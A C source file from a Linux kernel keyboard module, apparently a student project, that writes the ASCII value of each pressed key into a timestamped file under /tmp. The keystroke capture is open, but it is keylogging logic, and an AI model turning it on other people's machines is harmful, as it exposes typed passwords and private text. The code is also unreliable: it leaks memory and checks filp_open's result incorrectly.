/**
 * tmpfile.c - /tmp/42module_keyboard file configration
 * 
 * unlink an open file - https://wiki.sei.cmu.edu/confluence/display/c/FIO08-C.+Take+care+when+calling+remove()+on+an+open+file
*/
#include "42kb.h"
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/string.h>

struct file* tmpfile = 0;
loff_t tmpoffset = 0;

static int ft_write_tmpfile(char *str, int len)
{
	const struct file_operations	*f_op = tmpfile->f_op;

	if (!f_op)
	{
		ft_warn("No fop on tmpfile\n");
		return 1;
	}

	return kernel_write(tmpfile, str, len, &tmpoffset);
}

int ft_create_tmpfile(void)
{
	char *time;
	char *filename;
	char *prefix;

	time = ft_itoa(ktime_get_seconds());
	filename = kmalloc(69, GFP_KERNEL);
	prefix = kmalloc(69, GFP_KERNEL);
	strcpy(prefix, "/tmp/42kb");
	filename = strcat(prefix, time);
	tmpfile = filp_open(filename, O_WRONLY | O_CREAT, S_IRWXU);
	kfree(filename);
	kfree(time);
	if (tmpfile) {
		printk("Created tmpfile %s\n", tmpfile->f_path.dentry->d_name.name);
		return 0;
	}
	else
	{
		ft_warn("Cannot create tmpfile");
		return 1;
	}
}

void ft_log_tmpfile(void)
{
	char *temp_str;
	struct list_head *head_ptr;
	struct event_struct *entry;

	head_ptr = g_driver->events_head->list.next;
	while (head_ptr != &(g_driver->events_head->list))
	{
		entry = list_entry(head_ptr, struct event_struct, list);

		if (entry->is_pressed)
		{
			temp_str = event_to_str(*entry);
			if (entry->ascii_value > 0)
				ft_write_tmpfile(&(entry->ascii_value), 1);
			
			// ft_write_tmpfile(temp_str);
			kfree(temp_str);
		}

		head_ptr = head_ptr->next;
	}
}